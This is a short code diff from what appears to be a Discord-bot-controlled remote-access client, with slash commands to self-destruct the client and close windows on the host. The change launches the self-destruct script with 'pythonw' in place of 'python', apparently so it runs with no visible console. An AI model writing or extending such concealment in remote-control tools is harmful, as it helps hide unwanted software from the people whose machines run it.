@@ -342,7 +342,7 @@ sys.exit(0)
             with open(os.path.join(target_path, script_file), "w") as file:
                 file.write(script_content)
                 file.close()
-        subprocess.Popen(["python", os.path.join(target_path, "self-destruct.pyw")])
+        subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
         sys.exit(0)
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
@@ -377,7 +377,7 @@ sys.exit(0)
         with open(os.path.join(target_path, script_file), "w") as file:
             file.write(script_content)
             file.close()
-    subprocess.Popen(["python", os.path.join(target_path, "self-destruct.pyw")])
+    subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
     sys.exit(0)
     
 @client.slash_command(guild_ids=testServerId, description="Closes the window selected.")
